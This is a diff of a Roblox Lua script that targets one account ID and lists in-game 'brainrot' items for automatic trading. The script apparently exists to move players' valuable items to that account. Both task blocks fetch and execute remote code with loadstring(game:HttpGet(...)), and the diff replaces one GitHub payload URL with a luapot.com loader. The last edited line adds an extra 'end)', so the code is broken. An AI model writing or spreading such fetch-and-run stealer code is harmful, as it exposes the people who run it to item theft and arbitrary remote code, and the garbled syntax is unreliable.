@@ -3,10 +3,16 @@ getgenv().TARGET_ID = 6219924104
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
 getgenv().TARGET_BRAINROTS = {
+    ["Quackini Snackini"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Kalika Bros"] = true,
+    ["Digi Narwhal"] = true,
+    ["Gym Bros"] = true,
+    ["Globa Steppa"] = true,
     ["Strawberry Elephant"] = true,
     ["Meowl"] = true,
-    ["Skibidi Toilet"] = true,
     ["Headless Horseman"] = true,
+    ["Skibidi Toilet"] = true,
     ["Griffin"] = true,
     ["Hydra Dragon Cannelloni"] = true,
     ["Dragon Gingerini"] = true,
@@ -46,20 +52,17 @@ getgenv().TARGET_BRAINROTS = {
     ["Garama and Madundung"] = true,
     ["Fishino Clownino"] = true,
     ["Jolly Jolly Sahur"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Rico Dinero"] = true,
     ["Tirilikalika Tirilikalako"] = true,
-    ["Swaggy Bros"] = true,
     ["Dug dug dug"] = true,
-    ["Chillin Chili"] = true,
-    ["Gym Bros"] = true,
-    ["Digi Narwhal"] = true,
-    ["Kalika Bros"] = true,
     ["Los Chillis"] = true,
-    ["Hopilikalika Hopilikalako"] = true,
-    ["Centrucci Nuclucci"] = true
+    ["Chillin Chili"] = true,
+    ["Fragola La La La"] = true
 }
 task.spawn(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dadas45845/limitedhublph/refs/heads/main/morreira"))()
+loadstring(game:HttpGet("https://luapot.com/api/loadstring/fb14c57cabe9536a3bac0c101cf7abc7"))()
 end)
 task.spawn(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Chiron-ux/Kawatan/27919507c04a426f982eccf82e32b49bae400ebf/Kawatan"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Chiron-ux/Kawatan/27919507c04a426f982eccf82e32b49bae400ebf/Kawatan"))() end)
 end)
